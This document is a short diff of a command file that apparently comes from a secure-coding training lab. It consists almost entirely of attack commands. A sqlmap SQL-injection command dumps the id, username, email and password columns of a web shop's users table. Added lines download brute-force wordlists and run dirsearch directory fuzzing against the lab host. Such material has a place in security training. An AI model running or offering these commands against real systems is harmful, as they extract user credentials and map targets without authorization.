@@ -1,2 +1,9 @@
-python sqlmap.py -u "http://192.168.99.100:32772/rest/product/search?q=apple" -p q --level=3 --risk=1 --dbms sqlite --flush-session
-python sqlmap.py -u "http://192.168.99.100:32772/rest/product/search?q=apple" -p q --level=3 --risk=1 --dump --no-cast --no-escape -T users -C "id,username,email,password"
+# hack with sqlmap
+python sqlmap.py -u "https://f1fe71a1.labs.secure-coding-schulung.de/rest/product/search?q=apple" -p q --level=3 --risk=1 --dbms sqlite --flush-session --dump --no-cast --no-escape -T users -C "id,username,email,password"
+
+# directory fuzzing
+wget https://localdomain.pw/Content-Bruteforcing-Wordlist/dirsearch-wordlist.txt
+wget https://localdomain.pw/Content-Bruteforcing-Wordlist/burp-wordlist.txt
+git clone https://github.com/maurosoria/dirsearch.git dirsearch
+cd dirsearch
+python3 dirsearch.py -u https://f1fe71a1.labs.secure-coding-schulung.de -e "php" -w ../dirsearch-wordlist.txt
